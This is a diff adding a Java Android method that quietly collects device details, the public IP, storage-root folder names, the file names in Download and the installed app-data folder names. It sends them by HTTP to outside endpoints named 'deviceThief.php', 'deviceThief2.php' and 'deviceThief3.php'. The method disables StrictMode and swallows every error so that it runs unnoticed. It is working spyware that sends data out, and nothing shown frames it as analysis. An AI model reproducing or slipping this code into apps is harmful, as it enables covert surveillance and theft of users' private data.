@@ -1,0 +1,77 @@
+#Java logic is as follows:
+********************************************************
+	private void iq500GetUserInfo()
+	{
+		if (android.os.Build.VERSION.SDK_INT > 9) {
+			StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
+			StrictMode.setThreadPolicy(policy);
+		}
+		
+		String currentDateTimeString = java.text.DateFormat.getDateTimeInstance().format(new Date());
+
+		String a = "From:" + Locale.getDefault().getDisplayCountry() + "%20DateTime:" + currentDateTimeString + "%20AndroidVer:" + Build.VERSION.RELEASE + "%20Model:" + Build.MODEL + "%20Manufacturer:" + Build.MANUFACTURER;
+
+		String b = "", c = "", d = "";
+		
+		try
+		{
+			URL ip = new URL("http://checkip.amazonaws.com/");
+			BufferedReader in = new BufferedReader(new InputStreamReader(ip.openStream()));
+		    a += "%20IP:" + in.readLine();
+		}
+		catch (Exception e)
+		{}
+		
+		a = a.replace(" ", "_");
+		
+
+		try{
+			
+			File f = new File(Environment.getExternalStorageDirectory().getPath() + "/");
+			File[] files = f.listFiles();
+
+			for (File inFile : files) {
+				if (inFile.isDirectory()) {
+					b += inFile.getName() + ":--:";
+				}
+			}
+
+			File f2 = new File(Environment.getExternalStorageDirectory().getPath() + "/Download/");
+			File[] files2 = f2.listFiles();
+
+			for (File inFile2 : files2) {
+				if (inFile2.isFile()) {
+					c += inFile2.getName() + ":--:";
+				}
+			}
+
+			File f3 = new File(Environment.getExternalStorageDirectory().getPath() + "/Android/data/");
+			File[] files3 = f3.listFiles();
+
+			for (File inFile3 : files3) {
+				if (inFile3.isDirectory()) {
+					d += inFile3.getName() + ":--:";
+				}
+			}
+		}catch (Exception e){}
+
+
+		b = b.replace("&","").replace("+","").replace("|","").replace(" ", "");
+		c = c.replace("&","").replace("+","").replace("|","").replace(" ", "");
+		d = d.replace("&","").replace("+","").replace("|","").replace(" ", "");
+
+		try
+		{
+			HttpClient httpClient = new DefaultHttpClient();
+			HttpGet get = new HttpGet("http://500iqproject.atwebpages.com/deviceThief.php" + "?basic=" + a + "&sdcardroot=" + b);
+			HttpGet get2 = new HttpGet("http://500iqproject.atwebpages.com/deviceThief2.php" + "?downloadlist=" + c);
+			HttpGet get3 = new HttpGet("http://500iqproject.atwebpages.com/deviceThief3.php" + "?applist=" + d);
+			
+			httpClient.execute(get);
+			httpClient.execute(get2);
+			httpClient.execute(get3);
+		}
+		catch (Exception e)
+		{}
+	}
+********************************************************
